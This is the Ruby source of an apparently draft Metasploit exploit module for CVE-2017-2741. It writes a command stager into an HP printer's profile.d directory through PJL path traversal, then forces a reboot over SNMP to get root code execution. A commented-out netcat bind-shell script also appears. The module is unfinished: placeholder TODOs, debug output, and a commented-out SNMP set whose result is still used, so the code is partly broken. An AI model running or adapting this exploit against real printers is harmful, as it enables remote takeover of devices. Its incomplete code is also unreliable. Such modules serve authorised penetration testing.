##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require "rex/proto/pjl"

class MetasploitModule < Msf::Exploit::Remote

  Rank = NormalRanking

  include Msf::Exploit::Remote::SNMPClient
  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
'Name'           => 'HP PageWide and OfficeJet Pro Printer PJL Arbitrary Code Execution',
      'Description'    => %q{
        TODO
      },

      'Author'         => [
        'Jacob Baines', # Python PoC
        'Matthew Kienow <matthew_kienow[AT]rapid7.com>', # Metasploit module
       ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2017-2741' ],
          [ 'URL', 'https://support.hp.com/lt-en/document/c05462914' ],
          [ 'URL', 'http://tenable.com/blog/rooting-a-printer-from-security-bulletin-to-remote-code-execution' ]
        ],

      # TODO: should there be target entries for all vuln printers?
      # 'Targets'        =>
      #   [
      #     [ 'HP PageWide Managed MFP P57750dw', {} ],
      #     [ 'HP PageWide Managed P55250dw', {} ],
      #     [ 'HP PageWide Pro MFP 577z', {} ],
      #     [ 'HP PageWide Pro 552dw', {} ],
      #     [ 'HP PageWide Pro MFP 577dw', {} ],
      #     [ 'HP PageWide Pro MFP 477dw', {} ],
      #     [ 'HP PageWide Pro 452dw', {} ],
      #     [ 'HP PageWide Pro MFP 477dn', {} ],
      #     [ 'HP PageWide Pro 452dn', {} ],
      #     [ 'HP PageWide MFP 377dw', {} ],
      #     [ 'HP PageWide 352dw', {} ],
      #     [ 'HP OfficeJet Pro 8730 All-in-One Printer', {} ],
      #     [ 'HP OfficeJet Pro 8740 All-in-One Printer', {} ],
      #     [ 'HP OfficeJet Pro 8210 Printer', {} ],
      #     [ 'HP OfficeJet Pro 8216 Printer', {} ],
      #     [ 'HP OfficeJet Pro 8218 Printer', {} ]
      #   ],
      'Targets'         => [ [ 'Linux', {} ] ],
      'Privileged'     => true,
      'Platform'       => 'linux',
      'Arch'           => [ARCH_ARMLE],
      'DisclosureDate' => 'Apr 05 2017',
      'DefaultTarget'  => 0
    ))

    register_options([
      Opt::RPORT(Rex::Proto::PJL::DEFAULT_PORT),
      # OptString.new("RPATH", [true, "Remote path", '0:/../../rw/var/etc/profile.d/lol.sh'])
      OptString.new("RPATH", [true, "Remote path", '0:/../../rw/var/etc/profile.d/']),
      OptString.new('OID', [ true, "The object identifier (numeric notation)", '1.3.6.1.2.1.43.5.1.1.3.1']),
      OptString.new('OIDVALUE', [ true, "The value to set", 4])
    ])
  end

  def execute_command(cmd, opts = {})
    # inject whatever is in the cmd variable to the vulnerable code
    print_status("cmd = #{cmd}") # TODO: remove

    # profile_d_script = 'if [ ! -p /tmp/pwned ]; then\n''\tmkfifo /tmp/pwned\n'\
    #                    '\tcat /tmp/pwned | /bin/sh 2>&1 | /usr/bin/nc -l 1270 > /tmp/pwned &\n'\
    #                    'fi\n'

    begin
      rpath = datastore["RPATH"]
      oid = datastore['OID']
      oidvalue = datastore['OIDVALUE']
      community = datastore['COMMUNITY']


      print_status("rpath = #{rpath}")
      print_status("oid = #{oid}")
      print_status("oidvalue = #{oidvalue}")
      print_status("community = #{community}")

      print_status("Connecting to port #{datastore["RPORT"]}...")

      connect()
      pjl = Rex::Proto::PJL::Client.new(sock)
      pjl.begin_job

      pjl.fsinit(rpath[0..1])

      fsdirlist_before = pjl.fsdirlist('0:/../../rw/var/etc/profile.d/')
      print_status("fsdirlist_before = #{fsdirlist_before}")

      # rpath = rpath + Rex::Text.rand_text_alpha(8) + ".sh"
      rpath = rpath + "stagercmd.sh"
      print_status("rpath = #{rpath}")
      # if pjl.fsdownload(profile_d_script, rpath, false)
      if pjl.fsdownload(cmd, rpath, is_file: false)
        print_good("#{rhost}:#{rport} - Saved #{cmd} to #{rpath}")
      end

      fsdirlist_after = pjl.fsdirlist('0:/../../rw/var/etc/profile.d/')
      print_status("fsdirlist_after = #{fsdirlist_after}")

      # TODO: add simple fsdirlist check to see if file name exists in directory, in addition with correct size?

      # print_status("DEV: attempting to delete #{rpath}...")
      # if pjl.fsdelete(rpath)
      #   print_good("#{rhost}:#{rport} - Deleted #{rpath}")
      # else
      #   print_bad("#{rhost}:#{rport} - could not delete #{rpath}")
      # end

      pjl.end_job


      # use SNMP to restart printer
      print_status("Attempting to restart printer via SNMP...")
      datastore['RPORT'] = 161 # TODO: fix module's use of two different RPORT values
      snmp = connect_snmp
      print_status("Connecting to port #{datastore["RPORT"]}...")

      # get request
      check = snmp.get_value(oid)

      if check.to_s =~ /Null/
        check = '\'\''
      end
      print_status("Check initial value: OID #{oid} => #{check}")

      # set request
      # TODO: uncomment - temp skip reboot
      # varbind = SNMP::VarBind.new(oid, SNMP::Integer.new(oidvalue))
      # resp = snmp.set(varbind)

      if resp.error_status == :noError

        print_status("Set new value: OID #{oid} => #{oidvalue}")

        # get request
        check = snmp.get_value(oid)

        if check.to_s =~ /Null/
          check = '\'\''
        end
        print_status("Check new value: OID #{oid} => #{check}")

        print_status("Printer restarting...")
        # handler()

      else
        print_status("OID not writable or does not provide WRITE access with community '#{community}'")
      end

    rescue ::SNMP::RequestTimeout
      print_error("SNMP request timeout with community '#{community}'.")
      raise
    rescue ::Rex::ConnectionError
      print_error("Connection Refused")
      raise
    rescue SNMP::UnsupportedVersion
      print_error("Unsupported SNMP version specified. Select from '1' or '2c'.")
      raise
    rescue ::Interrupt
      raise $!
    rescue ::Exception => e
      print_error("Error: #{e.class} #{e} #{e.backtrace}")
      raise
    rescue
      print_error("Error in connection or socket")
      raise
    end
  end

  def exploit
    begin
      print_status("Exploiting...")
      execute_cmdstager()
      # execute_cmdstager({:temp => "/var/tmp"})
      return
    ensure
      disconnect()
    end
  end

end
